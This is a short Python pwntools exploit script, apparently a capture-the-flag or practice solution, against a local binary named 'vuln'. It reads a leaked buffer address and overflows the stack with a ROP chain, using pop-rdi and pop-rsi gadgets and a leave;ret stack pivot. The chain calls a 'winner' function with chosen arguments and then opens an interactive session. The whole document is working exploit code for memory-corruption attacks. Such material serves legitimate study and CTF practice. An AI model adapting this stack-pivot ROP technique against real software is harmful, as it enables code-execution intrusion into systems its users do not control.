from pwn import *


elf = context.binary = ELF("./vuln")

# 0x0000000000401225 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040122b : pop rdi ; ret
# 0x0000000000401229 : pop rsi ; pop r15 ; ret
POP_RSP_POP_R13_POP_R14_POP_R15 = 0x0000000000401225
POP_RDI = 0x000000000040122b
POP_RSI_POP_R15 = 0x0000000000401229



# 0x000000000040117c : leave ; ret
# 0x0000000000401129 : pop rbp ; ret
LEAVE_RET = 0x000000000040117c
POP_RBP = 0x0000000000401129

p = process()
p.recvuntil(b"to: ")
buffer = int(p.recvline().decode()[2:],16)


rip_override = 104
rbp_override = 96

payload = flat([
    0x0,
    POP_RDI,
    0xdeadbeef,
    POP_RSI_POP_R15,
    0xdeadc0de,
    0x0,
    elf.sym["winner"],
    elf.sym["main"],
])

payload = flat([
    payload,
    b"A" * (rbp_override - len(payload)),
    buffer,
    LEAVE_RET,
])
print(len(payload))



# gdb.attach(p)
p.sendline(payload)
p.interactive()